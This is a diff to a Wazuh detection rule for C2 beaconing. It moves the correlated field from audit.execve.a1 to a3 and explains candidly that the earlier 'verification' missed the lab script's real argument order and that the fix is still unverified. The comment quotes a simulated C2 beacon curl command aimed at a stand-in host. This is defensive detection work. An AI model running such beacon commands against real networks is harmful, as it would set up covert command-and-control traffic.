@@ -85,15 +85,42 @@
        suspicious signal here, independent of whether any single fetch also looks like a payload
        download - chaining on the baseline rule is the correct scope.
 
-       Verify the exact aN index against a live audit.execve sample before relying on this in
-       production: it depends on how many flags/options precede the URL in the actual curl/wget
-       invocation (confirmed correct for the "curl <url> -s" argument order used by
-       generate_advanced_scenarios.sh, where the URL lands in a1; a different flag order would shift it). -->
+       CONFIRMED BUG (found by re-reading generate_advanced_scenarios.sh, not by live testing): the
+       previous revision used audit.execve.a1 and claimed this was the URL position for the repo's own
+       C2 scenario script. That is wrong. The script actually runs:
+           curl -s -m3 "http://c2-beacon-simulated.example.invalid/${p}?id=$i&t=$(date +%s)"
+       which decomposes as a0=curl, a1=-s, a2=-m3, a3=<url> - so same_field was comparing "-s" (always
+       identical across every curl invocation, regardless of destination), not the URL. The rule would
+       have fired on 3 fetches to 3 DIFFERENT destinations just as readily as 3 fetches to the same one,
+       which defeats the entire point of this rule (see revision note above). The manual wazuh-logtest
+       session that "confirmed" a1 during the earlier live-verification pass used a simpler manual curl
+       invocation (curl -s <url>, no -m3) that happens to put the URL at a1 - it did not exercise the
+       actual generator script's argument order, so that verification was real but did not cover the
+       case that matters. Corrected to audit.execve.a3 to match generate_advanced_scenarios.sh as it
+       exists today.
+
+       This positional match remains inherently fragile: ANY change to the flag order in the curl/wget
+       invocation (a different scenario script, a real attacker's tooling, a different curl version's
+       default flag placement) silently shifts the URL to a different aN index and this rule stops
+       correlating correctly - with no error, no warning, just silent false negatives (or worse, false
+       correlation on a shared flag value, as happened here). The robust fix is a custom Wazuh decoder
+       that extracts the URL via a single regex against full_log into a stable, position-independent
+       field (e.g. a normalized "pfa.destination") and correlates on that field instead of a raw
+       audit.execve.aN index - out of scope for this pass (requires deploying and testing a new decoder
+       on the VM, not just a rule change) but the correct long-term direction. Until then: re-verify the
+       exact aN index against a live audit.execve sample from the CURRENT scenario script before trusting
+       this rule, every time the script's curl/wget invocation changes.
+
+       STATUS: this a1->a3 fix has been applied here but NOT YET re-verified live on the VM (SSH key
+       access to the lab VM was unavailable during this pass - see README). Do not cite this rule as
+       "verified" for C2 beaconing until it has been retested with wazuh-logtest against the exact
+       generate_advanced_scenarios.sh invocation, including a negative case (3 fetches to 3 DIFFERENT
+       destinations must NOT fire 100103). -->
 
   <rule id="100103" level="10" frequency="3" timeframe="90">
     <if_matched_sid>100098</if_matched_sid>
-    <same_field>audit.execve.a1</same_field>
-    <description>Repeated network fetch commands to the same destination in a short window (possible C2 beaconing)</description>
+    <same_field>audit.execve.a3</same_field>
+    <description>Repeated network fetch commands to the same destination in a short window (possible C2 beaconing) - positional match on audit.execve.a3, fragile to argument order, see comment above</description>
     <mitre>
       <id>T1071</id>
     </mitre>
